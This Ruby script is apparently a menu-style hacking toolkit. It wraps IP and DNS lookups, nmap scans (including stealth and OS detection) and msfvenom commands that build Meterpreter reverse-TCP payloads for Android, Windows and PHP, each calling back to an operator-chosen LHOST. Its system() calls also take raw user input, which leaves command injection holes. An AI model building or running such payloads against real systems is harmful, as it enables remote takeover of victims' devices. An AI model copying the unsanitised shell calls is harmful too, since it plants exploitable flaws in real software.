#!/usr/local/bin/ruby

require 'colorize'
require 'artii'
require 'terminal-table'
require 'net/http'
require 'json'

# lookup modules

def iplookup
    puts "Enter IP to lookup"
    print " > "
    ip = gets.chomp
    uri = URI("http://ip-api.com/json/#{ip}")
    response = Net::HTTP.get(uri)
    parsed = JSON.parse(response)
    rows = []
    rows << ['IP', parsed['query']]
    rows << ['Country', parsed['country']]
    rows << ['City', parsed['city']]
    rows << ['ISP', parsed['isp']]
    rows << ['Latitude', parsed['lat']]
    rows << ['Longitude', parsed['lon']]
    rows << ['Region', parsed['region']]
    rows << ['Region Name', parsed['regionName']]
    rows << ['Timezone', parsed['timezone']]
    rows << ['Zip', parsed['zip']]
    table = Terminal::Table.new :title => 'IP Lookup', :headings => ['Type', 'Value'], :rows => rows
    puts table
end


def dnslookup
    puts "Enter domain to lookup"
    print " > "
    domain = gets.chomp
    uri = URI("https://api.hackertarget.com/dnslookup/?q=#{domain}")
    response = Net::HTTP.get(uri)
    puts response
end

# msf modules


def mpandroidreversetcp
    puts "Enter LHOST"
    print " > "
    lhost = gets.chomp
    puts "Enter LPORT"
    print " > "
    lport = gets.chomp
    puts "Enter output name (no .apk for example. /home/user/Desktop/payload)"
    print " > "
    output = gets.chomp
    puts "Creating payload..."
    system("msfvenom --platform Android --arch dalvik -p android/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} R > #{output}.apk")
    puts "Payload created!"
end

def mpwindowsreversetcp
    puts "Enter LHOST"
    print " > "
    lhost = gets.chomp
    puts "Enter LPORT"
    print " > "
    lport = gets.chomp
    puts "Enter output name (no .exe for example. /home/user/Desktop/payload)"
    print " > "
    output = gets.chomp
    puts "Creating payload..."
    system("msfvenom --platform Windows --arch x86 -p windows/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} R > #{output}.exe")
    puts "Payload created!"
end

def mpphpreversetcp
    puts "Enter LHOST"
    print " > "
    lhost = gets.chomp
    puts "Enter LPORT"
    print " > "
    lport = gets.chomp
    puts "Enter output name (no .php for example. /home/user/Desktop/payload)"
    print " > "
    output = gets.chomp
    puts "Creating payload..."
    system("msfvenom -p php/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} R > #{output}.php")
    puts "Payload created!"
end

# nmap modules

def defaultscan
    puts "Enter IP to scan"
    print " > "
    ip = gets.chomp
    puts "Starting scan..."
    system("nmap #{ip}")
end

def fastscan
    puts "Enter IP to scan"
    print " > "
    ip = gets.chomp
    puts "Starting scan..."
    system("nmap -F #{ip}")
end

def stealthscan
    puts "Enter IP to scan"
    print " > "
    ip = gets.chomp
    puts "Starting scan..."
    system("nmap -sS #{ip}")
end

def udp
    puts "Enter IP to scan"
    print " > "
    ip = gets.chomp
    puts "Starting scan..."
    system("nmap -sU #{ip}")
end

def osdetect
    puts "Enter IP to scan"
    print " > "
    ip = gets.chomp
    puts "Starting scan..."
    system("nmap -O #{ip}")
end